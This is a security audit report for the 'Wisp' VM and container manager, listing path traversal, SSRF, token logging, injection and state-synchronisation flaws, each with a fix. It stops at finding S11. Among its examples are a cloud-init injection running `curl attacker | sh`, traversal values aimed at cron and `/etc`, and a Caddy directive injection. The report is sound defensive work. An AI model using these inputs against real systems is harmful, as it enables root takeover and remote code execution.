# Wisp — Security & Code Audit

**Date:** 2026-04-28
**Scope:** Full repo at `/Users/acdtrx/projects/wisp` — backend (Node/Fastify), frontend (React), scripts, helpers, docs.
**Focus:** Security vulnerabilities, drift from `docs/CODING-RULES.md` and `docs/WISP-RULES.md`, state-synchronization risks, anything sketchy.

> Notes on reading this report
>
> - Findings are graded **Critical / High / Medium / Low / Info** for security and **Critical / High / Medium / Low** for state-sync. "Drift" findings are not severity-graded — they are deviations from project rules.
> - Every finding cites `path:line`. Where two findings interact (e.g. a path-traversal that amplifies a state-sync risk), the cross-reference is called out.
> - "Authenticated admin" is mentioned a lot. Wisp has a single shared password / single role — but the daemon runs privileged (sudoers NOPASSWD on `wisp-*` shims), so primitives that let an admin write outside their nominal blast radius (over `/etc`, into root cron paths, etc.) are real privilege boundary violations even though the admin already has full Wisp access.

---

## 0. Executive summary

The codebase is generally well-structured: architecture boundaries (single libvirt caller, single containerd caller) are respected, XML is parsed with `fast-xml-parser`, no CDN assets, no localStorage for authoritative state, SSE is used for live data, and CORS is gated to dev only. The login endpoint is rate-limited, SSRF has a check (with gaps), and `validateVMName` exists.

The main systemic problems are:

1. **Validation is inconsistent and not applied everywhere it must be.** `validateVMName` exists but is not called for `body.name` on `POST /vms` or `body.newName` on clone. `validateContainerName` exists but is **never** called on the container routes. This produces multiple **Critical** path-traversal primitives that turn an authenticated admin into "write/read/delete arbitrary host files as the daemon user."
2. **Privileged shell helpers (`wisp-*`) have no defense-in-depth path/argument scrubbing.** They trust the JS caller. Any regression upstream becomes immediate root-write on the host (`wisp-bridge --file-name ../etc/cron.d/pwn`, `wisp-mount` over `/etc`, etc.).
3. **State synchronization between libvirt / `container.json` / on-disk VM directory / mDNS / Avahi / NetworkManager bridges is partial and event-sparse.** Renaming a VM does not rename its directory, cloning a VM writes its disks into the source VM's directory, and the cloud-init `***` placeholder gets silently re-hashed as the literal string `***` on second-save — **silently changing the VM's password**.
4. **Logs leak JWTs.** Fastify's default request logger writes the full URL to stdout/journald, and SSE/WS auth uses `?token=...`. Any operator with log-read can replay sessions for 24 h.
5. **Coding-rule drift is mostly cosmetic** (29 `console.*` calls bypassing Pino, missing pino-pretty config, a couple of plain `Error` throws), with two real issues: SSE error frames are sometimes silently swallowed, and `data.message` precedence in the API client is inverted vs. the documented contract.

---

## 1. Security findings

### 1.1 Critical

#### C1. Path traversal in `POST /vms` — `body.name` unvalidated
- **File:** `backend/src/routes/vms.js:120-194`, `backend/src/lib/linux/vmManager/vmManagerCreate.js:271-345`
- **Issue:** `body.name` schema only constrains `string, minLength 1, maxLength 64` with `additionalProperties: true`. The route's `preHandler` validates `request.params.name` only. `createVM` then calls `getVMBasePath(name)` and `qemu-img create ... <vmBasePath>/disk0.qcow2` with the raw name. With `name="../../tmp/pwn"`, the daemon writes a multi-GB qcow2 outside `vmsPath`.
- **Risk:** Authenticated admin → write disk-image-sized files anywhere the daemon user can write (`/var/lib`, `/tmp`, world-writable mounts). DoS by filling `/`.
- **Fix:** Call `validateVMName(spec.name)` at the top of `createVM` (defense in depth) and validate `request.body.name` in the route preHandler. Set body schema `additionalProperties: false`.

#### C2. Path traversal in `POST /vms/:name/clone` — `body.newName` unvalidated
- **File:** `backend/src/routes/vms.js:478-494`, `backend/src/lib/linux/vmManager/vmManagerCreate.js:399-458`
- **Issue:** `cloneVM` constructs `newDiskPath = join(dirname(disk.source), \`${newName}…${ext}\`)`. With `newName="../../../tmp/pwn"`, the daemon copies the source disk to an arbitrary path.
- **Fix:** `validateVMName(newName)` in the route handler or `cloneVM`.

#### C3. Path traversal across **all** `/api/containers/*` routes — no `validateContainerName` preHandler
- **File:** `backend/src/routes/containers.js` (every `/containers/:name/...` handler — e.g. lines 250, 259, 268, 279, 351, 400, 423, 451, 528)
- **Issue:** Unlike `vms.js`, there is **no** preHandler validating `params.name`. Fastify decodes `%2F` in path params, so `/api/containers/..%2F..%2Fetc/runs/foo/log` → `params.name === "../../etc"`. `getContainerDir(name) = join(containersPath, name)` then resolves outside the containers root.
- **Risk:** Arbitrary file read via the run-log download (`createRunLogReadStream`); arbitrary directory `rm -rf` via `deleteContainer(name, true)`; arbitrary file overwrite via `putMountFileTextContent`.
- **Fix:** Add a single `preHandler` to the container plugin that calls `validateContainerName(request.params.name)` for every route with a `:name` param — mirror `vms.js:46-55`.

#### C4. `wisp-bridge --file-name` writes to anywhere under `/` as root (no path scrubbing)
- **File:** `backend/scripts/wisp-bridge:139,198`
- **Issue:** Helper runs as root via NOPASSWD sudoers; accepts `--file-name <name>` and writes/deletes `${NETPLAN_DIR}/${file_name}` with no validation. The current backend caller constructs safe filenames, but the helper has zero defense in depth — one regression upstream is full root.
- **Risk:** Latent root-write primitive (`--file-name ../cron.d/pwn` → `/etc/cron.d/pwn` mode 0600 root). One supply-chain or refactor mistake away from privesc.
- **Fix:** In `wisp-bridge`, validate `file_name` against the expected pattern (`^91-wisp-vlan__[a-zA-Z0-9._-]+__[0-9]+__[a-zA-Z0-9._-]+\.yaml$`) and assert `realpath -m "${NETPLAN_DIR}/${file_name}"` is still under `/etc/netplan/`.

#### C5. `wisp-mount` mountPath unrestricted — admin can mount over `/etc`, `/usr`, `/home`
- **File:** `backend/src/lib/settings.js:237-243,320-326`, `backend/scripts/wisp-mount:41-47,72-93`, `backend/src/routes/mounts.js:41-88,235-272`
- **Issue:** Validation only requires `mountPath` to start with `/`. `wisp-mount` then runs `mount -t cifs|ext4 <source> <mountPath>` as root. With `mountPath="/etc"` and a hostile SMB share, the admin shadows `/etc` (including `passwd`, `shadow`, `sudoers.d/`).
- **Risk:** Authenticated admin → host root.
- **Fix:** Constrain `mountPath` in `validateCommonFields` to `/mnt/wisp/...` (with `realpath` check). `wisp-mount` should also reject mountPath outside `/mnt/`.

---

### 1.2 High

#### H1. SSRF check is TOCTOU, doesn't re-validate redirects, and misses several private ranges
- **File:** `backend/src/lib/downloadFromUrl.js:14-44,89-167`
- **Issue:**
  - `assertUrlNotPrivate` runs `dns.lookup({ all: true })`, then `fetch(url, { redirect: 'follow' })` does its own DNS lookup → DNS rebinding bypass.
  - `redirect: 'follow'` follows 30x to (e.g.) `http://169.254.169.254/...` or `http://127.0.0.1/...` without re-checking.
  - `isPrivateIPv4` misses `0.0.0.0/8`, `100.64.0.0/10` (CGNAT), `192.0.0.0/24`, `198.18.0.0/15`, `224.0.0.0/4` (multicast), `255.255.255.255`.
  - `isPrivateIPv6` misses IPv4-mapped IPv6 (`::ffff:127.0.0.1`), `::ffff:0:0/96`.
- **Fix:** Resolve once, fetch by IP with explicit `Host:` header (or use an `undici` Agent with a `connect` hook re-checking the resolved IP). Set `redirect: 'manual'` and re-validate each redirect. Expand the private IP list including IPv4-mapped IPv6.

#### H2. `downloadWithProgress` (HAOS / Ubuntu cloud) bypasses the SSRF check entirely
- **File:** `backend/src/lib/downloadUtils.js:81-95`, callers `backend/src/lib/downloadHaos.js:52`, `backend/src/lib/downloadUbuntuCloud.js:80`
- **Issue:** Called only with hardcoded URLs today, but `redirect: 'follow'` means a hostile mirror or MITM can redirect to `http://127.0.0.1/`.
- **Fix:** Call `assertUrlNotPrivate` in `downloadWithProgress`; manual redirect handling.

#### H3. `POST /vms/:name/backup` accepts unrestricted `destinationPaths`
- **File:** `backend/src/routes/vms.js:288-340`, `backend/src/lib/linux/vmManager/vmManagerBackup.js:176-186`
- **Issue:** `destinationPaths: string[]` body field bypasses the configured-mount lookup. Only `startsWith('/')` and access-permission checks. Combined with C1, write disk-image-sized files anywhere.
- **Fix:** Remove `destinationPaths` from the public API (use `destinationIds` only), or constrain to `listConfiguredBackupRoots(settings)` (with `realpath` checks like `restoreBackup`).

#### H4. JWT in `?token=` is logged by Fastify default request logger
- **File:** `backend/src/index.js:49`, `backend/src/lib/auth.js:121-148`, `backend/src/routes/console.js:12`, `backend/src/routes/containerConsole.js:44`, `frontend/src/api/sse.js:50,157`
- **Issue:** `logger: true` with no `redact` writes the full URL to stdout. SSE/WS auth puts the JWT in `?token=`. Tokens valid 24 h. Operators / log shippers / journald = session replay.
- **Fix:** Configure Pino with `redact: ['req.url']` (or a custom `req` serializer that strips `token` from the query). Strongly prefer `HttpOnly; Secure; SameSite=Lax` cookies — EventSource sends cookies natively, removing the URL-token need.

#### H5. Cloud-init YAML injection via `hostname` / `username` / `sshKey`
- **File:** `backend/src/lib/cloudInit.js:51-103`, `backend/src/routes/cloudinit.js:48-63`
- **Issue:** YAML is built with template literals (`hostname: ${config.hostname}`, `- name: ${userEntry.name}`, `- "${key}"`, `macaddress: "${firstNicMac}"`). With `hostname: "x\nruncmd:\n  - 'curl attacker | sh'"`, the user injects arbitrary cloud-init directives — including `runcmd`, `write_files`, `packages`.
- **Risk:** Admin (or XSS) → arbitrary command execution as root inside any newly-provisioned guest.
- **Fix:** Use a YAML library (or strict whitelist), reject `\n`/`\r` in hostname/username, length-limit, JSON-stringify the value when emitting (single-line scalar with proper escapes).

#### H6. `attachDisk` / `attachISO` (and create-time `cdrom1Path` / `disk.sourcePath`) accept arbitrary host file paths
- **File:** `backend/src/routes/vms.js:545-578,663-690`, `backend/src/lib/linux/vmManager/vmManagerIso.js:9-30`, `backend/src/lib/linux/vmManager/vmManagerDisk.js:43-77`, `backend/src/lib/linux/vmManager/vmManagerCreate.js:301-317`
- **Issue:** The only check is `startsWith('/')`. `path: "/etc/shadow"` → libvirt opens that file as a block device for QEMU; an attacker-OS guest reads it.
- **Risk:** Admin → host file read (subject to libvirt apparmor/seclabel which varies by distro).
- **Fix:** Constrain attachable paths to `getImagePath()` and `getVMBasePath(name)`. Use `realpath` to canonicalize.

#### H7. SMB mount options injection via `username` / `password` containing `,`
- **File:** `backend/scripts/wisp-mount:43-48`, `backend/src/lib/linux/host/smbMount.js`
- **Issue:** `opts="rw,uid=...,username=${username},password=${password}"` — `,` in user/pass adds extra mount.cifs options. Password is also visible on the kernel command line via `mount -o ...` (`/proc/<pid>/cmdline` while mount runs).
- **Fix:** Use `-o credentials=<file>` (file with `username=`/`password=` lines, mode 0600) so the password never hits argv. Reject `,` in user/pass on the JS side.

#### H8. WebSocket console routes have no `Origin` check
- **File:** `backend/src/routes/console.js:8-89`, `backend/src/routes/containerConsole.js:39-132`
- **Issue:** WS bypasses CORS entirely. Auth is JWT-in-query only; the `Origin` header is never inspected. Combined with token in localStorage (M1) + any XSS, attacker controls VM via VNC.
- **Fix:** Validate `Origin` matches the configured frontend origin (or is same-origin) before bridging the TCP socket.

#### H9. Image library multipart upload — no `truncated` check, no cleanup of partial files
- **File:** `backend/src/routes/library.js:109-149`, `backend/src/index.js:55`
- **Issue:** 50 GiB per file; on truncation `data.file.truncated === true` but the route never checks. On pipeline error, partial file is not `unlink`'d.
- **Risk:** Disk-fill DoS by an authenticated user.
- **Fix:** After pipeline, `if (data.file.truncated) { await unlink(destPath); reply.code(422)... }`. Wrap the pipeline in try/finally with `unlink(destPath).catch(noop)` on error.

#### H10. `/api/containers/:name/runs/:runId/log` — header injection + path traversal in `Content-Disposition`
- **File:** `backend/src/routes/containers.js:400-414`
- **Issue:** `Content-Disposition: attachment; filename="${name}-${runId}.log"` interpolates raw `name`. Combined with C3 (no name validation), `name` can contain `/`, quotes, or — if Node's HTTP layer slips — CRLF.
- **Fix:** Apply C3's preHandler. Quote/escape filename or use RFC 5987 encoding.

#### H11. Login rate-limit `loginAttempts` Map is never pruned
- **File:** `backend/src/routes/auth.js:5-22`
- **Issue:** Entries are added per failed-IP but never swept. `recordFailedLogin` only updates. Pre-auth memory growth from many distinct IPs.
- **Fix:** Periodic sweep of expired entries; cap total map size; reject login (or fall-through with delay) when capped.

#### H12. `publicPaths` matched by raw URL string (path-prefix-naive)
- **File:** `backend/src/lib/auth.js:121-125`
- **Issue:** `publicPaths.has(urlPath)` is a plain set lookup on `request.url.split('?')[0]`. Trailing slashes / encoded equivalents may not match. Today only `/api/auth/login` is public so this is latent — but every future addition is a footgun.
- **Fix:** Compare against the route name (post-routing) or normalize aggressively.

#### H13. `/api/github/keys/:username` follows redirects, no rate limit
- **File:** `backend/src/routes/cloudinit.js:95-117`
- **Issue:** Auth-required (good). `fetch` follows redirects by default. If GitHub's `.keys` endpoint ever 30x redirected somewhere private, SSRF.
- **Fix:** `redirect: 'manual'`, small per-user/IP rate limit.

---

### 1.3 Medium

#### M1. JWT in `localStorage` — XSS = total takeover
- **File:** `frontend/src/api/client.js:1-13`
- **Issue:** No XSS exists today, but a single regression burns admin sessions for 24 h. Aggravated by the fact that a successful XSS could also open a same-origin WebSocket (H8).
- **Fix:** `HttpOnly; Secure; SameSite=Lax` cookie + CSRF token in a header. Strict CSP that disallows inline scripts.

#### M2. Plain-text password fallback in `wisp-password`
- **File:** `backend/src/lib/auth.js:14-39,90-105`
- **Issue:** `readPasswordFile` accepts either `scrypt:salt:hash` or raw plaintext. New installs write hashed, but the plaintext branch is still active code; `getSecret()` uses `sha256(plaintext)` as the JWT key when present.
- **Fix:** Per "feature-building, no migrations" rules, just remove the plaintext branch and refuse to start with a clear error if the file is plaintext. Setup script already writes hashed.

#### M3. Stack / internal-detail leakage in error responses
- **File:** `backend/src/lib/routeErrors.js:127-136`, multiple route handlers
- **Issue:** `handleRouteError` returns `detail: err.raw || err.message`. Many libs assign `err.raw = err.stderr || err.message` — qemu-img, mount, cp, libvirt, dbus stderr flow back to the client verbatim with internal paths/UUIDs.
- **Fix:** Distinguish "user-meaningful detail" from "raw stderr" — log raw server-side, return a curated message.

#### M4. `wisp-netns ipv4 <name> [ifname]` doesn't validate `ifname`
- **File:** `backend/scripts/wisp-netns:27-37`
- **Issue:** `ip -n NAME -4 addr show dev IFACE` is argv-based, so no shell injection, but odd `ifname` values like `--help` may misbehave.
- **Fix:** Apply the same regex validation as `route-add`.

#### M5. Caddy app `target` is interpolated raw into the Caddyfile
- **File:** `backend/src/lib/linux/containerManager/apps/caddy.js:130-137,22-87`
- **Issue:** Subdomain validates as DNS label, but `target` only checks "non-empty string". Emitted as `reverse_proxy ${host.target}`. With `target = "1.2.3.4 {\nbind 0.0.0.0\n}\n…"`, the user injects arbitrary Caddy directives.
- **Fix:** Validate `target` as `host:port` (allowlist scheme). Reject `\n`, `}`, `{`.

#### M6. CDROM/disk path bypasses image-library boundary at create time
- **File:** `backend/src/lib/linux/vmManager/vmManagerCreate.js:301-317`
- **Issue:** Same primitive as H6 but at create. Combined with C1, fully arbitrary host file as block device.
- **Fix:** Constrain to image library / per-VM dir / configured backup roots.

#### M7. `revertSnapshot` / `deleteSnapshot` don't validate `snapshotName`
- **File:** `backend/src/routes/vms.js:860-897`, `backend/src/lib/linux/vmManager/vmManagerSnapshots.js:77-121`
- **Issue:** Schema only declares `id: { type: 'string' }`. libvirt likely rejects path-y names, but no JS-side defense.
- **Fix:** Apply the same `^[a-zA-Z0-9 ._-]+$` regex used at create.

#### M8. Container mount `PUT /content` has no size cap on the request body
- **File:** `backend/src/routes/containers.js:486-500`, `backend/src/lib/linux/containerManager/containerManagerMountsContent.js:45`
- **Issue:** `MOUNT_FILE_CONTENT_MAX_BYTES = 512 KiB` is enforced for GET, not PUT. Default Fastify JSON body limit (~1 MB) applies.
- **Fix:** Enforce `MOUNT_FILE_CONTENT_MAX_BYTES` on `putMountFileTextContent` input.

#### M9. `additionalProperties: true` on `POST /vms` and `PATCH /vms/:name`
- **File:** `backend/src/routes/vms.js:194,506`
- **Issue:** Extra fields flow into `updateVMConfig`/`createVM`. Easy to accidentally consume an attacker-supplied field in a future change.
- **Fix:** `additionalProperties: false`.

#### M10. `wisp-mount` `source`s a JS-generated bash file
- **File:** `backend/scripts/wisp-mount:36-37,57-58`, `backend/src/lib/linux/host/smbMount.js:25-29,75-91`
- **Issue:** JS escaping is correct today. Any future regression in `escapeShellValue` → arbitrary shell as root.
- **Fix:** Replace `source` with a plain key=value parser (or pass JSON + `jq`). No shell evaluation of user-derived content.

#### M11. `?token=` accepted on every route, not just SSE/WS
- **File:** `backend/src/lib/auth.js:130-134`
- **Issue:** Browser can hit any route with `?token=...` (image tags, link previews, referrers, browser history).
- **Fix:** Only accept `?token=` for SSE/WS routes.

---

### 1.4 Low

#### L1. Schema body-name length (64) doesn't match `validateVMName` (128)
- **File:** `backend/src/lib/validation.js:5`, `backend/src/routes/vms.js:124,481`
- **Fix:** Pick one limit and use it in both.

#### L2. `mountResponseSchema` allows `password` field through
- **File:** `backend/src/routes/mounts.js:13-28`, `backend/src/lib/settings.js:92-110`
- **Issue:** `mountForApi` masks today, but the response schema doesn't strip `password` — accidental future inclusion would slip through.
- **Fix:** Drop `password` from the response schema entirely.

#### L3. `process.umask(0o077)` is process-global during SMB temp dir creation
- **File:** `backend/src/lib/linux/host/smbMount.js:75-78,109-111`, `backend/src/lib/linux/host/diskMount.js:75-78`
- **Issue:** Other concurrent handlers see the temporary umask.
- **Fix:** Drop `process.umask`; rely on `mkdtemp({ mode: 0o700 })` and `writeFile(..., { mode: 0o600 })` (already used).

#### L4. Snapshot `mem` filename uses unvalidated VM name
- **File:** `backend/src/lib/linux/vmManager/vmManagerSnapshots.js:55-58`
- **Issue:** Amplifier of C1.
- **Fix:** Resolves with C1.

#### L5. `findUniqueFilename` doesn't `realpath`/use O_EXCL
- **File:** `backend/src/lib/downloadUtils.js:15-34`
- **Issue:** TOCTOU between `access` and `createWriteStream` — a symlink swap follows the link.
- **Fix:** `createWriteStream(destPath, { flags: 'wx' })`.

#### L6. `request.ip` source — latent if `trustProxy` is ever enabled
- **File:** `backend/src/routes/auth.js:45`, `backend/src/index.js:49`
- **Issue:** Default `trustProxy: false` is correct. Future enabling makes `X-Forwarded-For` attacker-controllable → rate-limit bypass.
- **Fix:** Document; if added, gate behind upstream-IP allowlist.

#### L7. `process.env.GITHUB_TOKEN` lives in `config/runtime.env`
- **File:** `backend/src/lib/downloadHaos.js:26-28`
- **Issue:** Operator setup must enforce 0o600 on `runtime.env`.
- **Fix:** Document in setup script; assert mode at boot.

#### L8. WebSocket close reasons include user-derived `err.message`
- **File:** `backend/src/routes/console.js:24,40`, `backend/src/routes/containerConsole.js:56,71`
- **Fix:** Sanitize or use generic strings.

---

### 1.5 Info

- **I1.** No security headers (CSP, HSTS, X-Frame-Options) — backend doesn't need them in prod (frontend proxy serves UI), but the frontend deployment must set a strict CSP. (`backend/src/index.js`)
- **I2.** SSE responses bypass `onSend` hooks (because of `reply.hijack()`) — fine, just noting. (`backend/src/lib/sse.js:11-23`)
- **I3.** CORS in dev is single-origin (`localhost:5173`), no `credentials: true` — correct. (`backend/src/index.js:51-53`)
- **I4.** Bearer-header auth makes classic CSRF impossible, but `?token=` accepted everywhere reopens it for GETs. See M11.

---

## 2. Drift from `docs/CODING-RULES.md` and `docs/WISP-RULES.md`

### 2.1 Real drift (worth fixing)

#### D1. 29 backend `console.*` log sites bypass Pino
- **Files:** `index.js:159`, `lib/config.js:50`, `lib/linux/mdnsManager.js:43,62,68,73,184,257`, `lib/linux/mdnsForwarder.js:60`, `lib/linux/vmManager/vmManagerSnapshots.js:36`, `lib/linux/vmManager/vmManagerCloudInit.js:170`, `lib/linux/vmManager/vmManagerConfig.js:244`, `lib/linux/vmManager/vmManagerList.js:67,79`, `lib/linux/vmManager/vmManagerConnection.js:68,74,80,106,189`, `lib/linux/vmManager/vmManagerHost.js:44,82`, `lib/linux/vmManager/vmManagerCreate.js:391,511`, `lib/linux/containerManager/containerManagerConnection.js:46,52`, `lib/linux/containerManager/containerManagerList.js:114,126`, `lib/linux/containerManager/containerManagerConfigIo.js:38`, `lib/darwin/vmManager/index.js:35`
- **Rule:** CODING-RULES §10 — "Remove all debug logging before committing"; project uses Pino.
- **Fix:** Pass `app.log` into modules at `connect()` (already done for some sites — e.g. `containerManager.connect({ logger })`); replace `console.warn` with `state.logger.warn({ err })`.

#### D2. No `pino-pretty` configuration in dev
- **File:** `backend/src/index.js:49`
- **Rule:** User global preference (single-line dev logs with `translateTime: 'HH:MM:ss.l'` and a documented `ignore` list).
- **Fix:** Conditionally set `transport: { target: 'pino-pretty', options: { translateTime: 'HH:MM:ss.l', singleLine: true, ignore: 'pid,hostname,reqId,req.host,req.remoteAddress,req.remotePort' } }` when `NODE_ENV === 'development'`.

#### D3. `/api/stats` SSE swallows errors instead of emitting `{ error, detail }`
- **File:** `backend/src/routes/stats.js:74-77`
- **Rule:** routes/CLAUDE.md — "When sending an error over SSE … use the same shape: `{ error, detail }`."
- **Fix:** Match the `/vms/stream` pattern: `reply.raw.write('data: ' + JSON.stringify({ error: 'Failed to gather stats', detail: err.message, code: err.code }) + '\n\n')`.

#### D4. `/api/containers/stream` swallows errors silently
- **File:** `backend/src/routes/containers.js:91-96`
- **Rule:** Same as D3.
- **Fix:** Emit `{ error, detail, code? }` on the SSE channel.

#### D5. `frontend/src/api/client.js` inverts `data.error` vs `data.message` precedence
- **File:** `frontend/src/api/client.js:38`
- **Rule:** WISP-RULES "Error Handling (applied)" — "API client builds thrown Error messages from the server's `error` response field (`data.error`; `data.message` is optional for compatibility)."
- **Drift:** `const msg = data.message || data.error || …` — should be `data.error || data.message || …`. Latent today (no route emits `message`).
- **Fix:** Swap the precedence.

#### D6. `auth.js` and `diskSmart.js` throw plain `new Error` (no `code`)
- **Files:** `backend/src/lib/auth.js:40,113`, `backend/src/lib/linux/host/diskSmart.js:199-221`
- **Rule:** CODING-RULES §5 — structured errors with `code`.
- **Fix:** `createAppError('NO_PASSWORD_CONFIGURED', …)` etc.

#### D7. `containerManagerNetwork.discoverIpv4InNetns` uses flat 250 ms × 80 polling
- **File:** `backend/src/lib/linux/containerManager/containerManagerNetwork.js:432`
- **Rule:** WISP-RULES "Async & Timing" — exponential backoff via `setImmediate`. All siblings (`waitForStop`, `waitUntilTaskStoppedOrGone`) already do this; only `discoverIpv4InNetns` is flat.
- **Fix:** Either switch to exponential backoff, or comment why flat is the right choice for DHCP timing.

#### D8. `IconPickerModal.jsx` uses `setTimeout(focus, 50)` to defer focus
- **File:** `frontend/src/components/shared/IconPickerModal.jsx:17`
- **Rule:** CODING-RULES §6 — never use sleep/timer to work around races.
- **Fix:** `useLayoutEffect` or `requestAnimationFrame(() => inputRef.current?.focus())`.

#### D9. `XMLModal.jsx` silent catch with no comment
- **File:** `frontend/src/components/vm/XMLModal.jsx:76`
- **Rule:** CODING-RULES §5 — every silent `catch {}` needs an explaining comment.
- **Fix:** Add a brief comment, or include `err.message` in the displayed string.

#### D10. `/api/host/disks` and `/api/host/disks/stream` not in `docs/spec/API.md`
- **File:** `backend/src/routes/host.js:338,353` vs `docs/spec/API.md`
- **Rule:** CLAUDE.md "Docs and Spec Sync".
- **Fix:** Add the two sections.

#### D11. Most container routes lack `schema.response`
- **File:** `backend/src/routes/containers.js` (only ~2 of 36 endpoints define `response`; cf. `vms.js` 8, `host.js` 13)
- **Rule:** WISP-RULES — "Fastify route response schemas are authoritative for serialized API output."
- **Fix:** Add response schemas to detail endpoints (`GET /:name`, `GET /:name/stats`).

### 2.2 What's clean

- Architecture boundaries: only `linux/vmManager/**`, `linux/mdnsManager.js`, and the `vmManager.js` facade import `dbus-next`. Only `linux/containerManager/**` imports `@grpc/grpc-js`. Verified via grep.
- No regex-based XML parsing; all libvirt XML is `fast-xml-parser`.
- No CDN assets; system fonts only.
- No `var`; `const`/`let` used throughout.
- No `localStorage` for VM/container metadata (only the auth token, which is the appropriate use for the current cookie-less design).
- SSE is used everywhere for live data (host stats, VM list, VM stats, container list, container stats, jobs, USB, disks).
- CORS is gated to dev only and to `localhost:5173`.

---

## 3. State synchronization risks

State is split across libvirt domain XML, on-disk per-VM/per-container directories, `wisp-config.json`, mDNS/Avahi entries, NetworkManager bridges, in-memory job stores, and frontend Zustand stores. Drift accrues at write boundaries and when one source mutates without notifying the others.

### 3.1 Critical

#### S1. VM rename does not rename the per-VM directory under `vmsPath`
- **State A:** libvirt domain `<name>` (changed via `iface.Rename`) — `backend/src/lib/linux/vmManager/vmManagerConfig.js:61`
- **State B:** on-disk dir `<vmsPath>/<name>/` (`disk0.qcow2`, `cloud-init.iso`, `cloud-init.json`, `VARS.fd`, `snapshots/*.mem`) — `paths.js:10` `getVMBasePath(name)`
- **Drift scenario:** `Rename` changes only the domain XML's `<name>`. Domain XML disk `<source file="..."/>` stays absolute, so the running VM is fine. But every helper that derives paths from the new name (`getVMBasePath(newName)`) — backups, cloud-init regenerate, snapshots `*.mem`, NVRAM detection, `deleteVM` cleanup — looks at a directory that doesn't exist. `deleteVM` (`vmManagerCreate.js:530-547`) does `rm -rf` on the new-name dir → no-op → orphan disk forever under old-name dir.
- **Fix direction:** Rename the on-disk directory atomically alongside the libvirt rename; rewrite every absolute path in the domain XML (disk `<source>`, NVRAM, snapshot memory) to the new location; redefine snapshot XML so memory `@file` paths follow. Or stop deriving from `name`; key directories by UUID.

#### S2. Cloned VM disks land in the **source** VM's directory, not the new VM's
- **State A:** Disks copied into `dirname(disk.source)` — `vmManagerCreate.js:421-431`
- **State B:** `getVMBasePath(newName)` (the expected per-VM directory) is never created/used.
- **Drift scenario:** Cloning `oldvm` → `newvm` produces files like `<vmsPath>/oldvm/newvm.qcow2`. The cloned VM's XML refers to those files, so it boots — but the new VM has no directory of its own. Deleting `newvm` `rm -rf <vmsPath>/newvm` is a no-op (orphan). Deleting `oldvm` deletes `newvm`'s disks too.
- **Fix direction:** Always copy clones into `getVMBasePath(newName)` (mkdir first) and rewrite cloned disk source paths to that directory.

#### S3. Cloud-init `***` placeholder gets re-hashed as the literal string `***` on second save
- **State A:** `cloud-init.json` after first save — `vmManagerCloudInit.js:30-31`
- **State B:** Real cloud-init password (consumed once for ISO build, then replaced with `***` in the JSON)
- **Drift scenario:** First save: ISO built with hashed password, JSON gets `password: '***'`. Second save (e.g. user edits SSH key): `generateCloudInit` (`cloudInit.js:79-82`) sees `config.password === '***'` and runs `await hashPassword('***')`, silently giving the VM a working password of `***`.
- **Severity:** Critical — silent data corruption / silent password downgrade. UI never indicates this happened.
- **Fix direction:** When `config.password === '***'` (or `'set'`), preserve the previous hashed password from prior state. Or store the hashed `passwd` in `cloud-init.json` so it survives. Or never persist the placeholder.

### 3.2 High

#### S4. VM rename leaves snapshot external memory file paths absolute → revert breaks
- **State A:** Snapshot XML's `memory @file` — `vmManagerSnapshots.js:58-63`
- **State B:** Per-VM dir after rename
- **Drift scenario:** Even after S1 is fixed, libvirt's per-snapshot XML retains the pre-rename absolute path. Live revert fails because the file isn't where the XML says.
- **Fix direction:** On rename, walk `ListDomainSnapshots`, parse each, rewrite `memory @file`, redefine via `SnapshotCreateXML` with `VIR_DOMAIN_SNAPSHOT_CREATE_REDEFINE`.

#### S5. `deleteVM(name, deleteDisks=false)` is asymmetric — removes cloud-init but keeps disks
- **File:** `vmManagerCreate.js:530-547`
- **Drift scenario:** With `deleteDisks=false`, cloud-init.iso/.json removed from the dir, but the dir + disks remain. A subsequent `createVM(sameName)` runs `qemu-img create` against an existing `disk0.qcow2` and either fails or overwrites. User who chose "keep my data" already lost the cloud-init half.
- **Fix direction:** Either always `rm -rf` the dir, or never touch it on `deleteDisks=false`.

#### S6. `container.json` is written non-atomically (truncate-and-rewrite)
- **File:** `backend/src/lib/linux/containerManager/containerManagerConfigIo.js:25-29` (and `settings.js:226` for `wisp-config.json`)
- **Drift scenario:** Crash, ENOSPC, or kernel panic mid-write leaves a half-/empty/truncated JSON file. On restart, `readContainerConfig` throws. `findContainersUsingImage`, `listContainers`, and `deleteContainer`'s teardown swallow such failures and either skip the container or leak its CNI network/snapshot.
- **Fix direction:** `write(tmp); rename(tmp, final)`. Same for `wisp-config.json`.

#### S7. Background jobs are in-memory only — restart loses every running job + leaves partial artifacts
- **File:** `backend/src/lib/jobStore.js:14`, all `*JobStore.js`
- **Drift scenario:** A 4 GB cloud-image download is at 70% → backend restarts. Child process (or in-process http stream) torn down. Partial file remains in `imagePath`. SSE client reconnects, sees no job — silent loss. VM-create jobs leave half-defined VMs and partial `disk0.qcow2`. Backup jobs leave half-`.gz`'d destinations.
- **Fix direction:** On startup, scan for partial artifacts and clean them up. Long-term, persist job records (or a marker file per active job) so the UI can surface "interrupted" states.

### 3.3 Medium

#### S8. Image library rename/delete is unguarded — domain XML CDROMs can dangle
- **Files:** `backend/src/routes/library.js:181,493-499`, vs `vmManagerCreate.js:303` (CDROMs reference absolute library paths)
- **Drift scenario:** User renames or deletes an ISO that's currently attached as `cdrom1` to a VM. Domain XML still references the old absolute path → next start fails with "no such file".
- **Fix direction:** Block rename/delete when any domain references the file (mirror `assertBridgeNotInUse`); or rewrite each affected `<source file=…>`.

#### S9. `container.json` `imageDigest` and containerd's image store can diverge
- **File:** `backend/src/lib/linux/containerManager/containerManagerCreate.js:432-436,525-529`
- **Drift scenario:** Operator runs `ctr -n wisp image rm <ref>` while the container is stopped. `startExistingContainer` reads `config.image`, fails to load image config, continues with `imageConfig = {}`, and `prepareSnapshot` throws `IMAGE_PULL_FAILED 'Image has no layers'`. No automatic re-pull.
- **Fix direction:** When `getImageConfig` fails on start, automatically `pullImage(config.image)` before `prepareSnapshot`.

#### S10. USB device removal on host doesn't detach from VMs
- **State A:** Host USB inventory (sysfs watch) — `backend/src/lib/linux/host/usbMonitor.js:307`
- **State B:** VM `<hostdev type='usb'>` in domain XML — `vmManagerUsb.js:21-118`
- **Drift scenario:** User unplugs a USB attached to a running VM. `usbMonitor` sees it; only the host-USB SSE consumes the event. VM XML still claims it; on next VM start, libvirt fails ("device not found").
- **Fix direction:** Subscribe to USB removal events in vmManager and call `detachUSBDevice` for any VM referencing the now-absent vendor:product. Or accept the staleness and surface a warning in the USB section.

#### S11. Container `network.ip` stays stale after DHCP renewal
- **File:** `backend/src/lib/linux/containerManager/containerManagerNetwork.js:457-468`
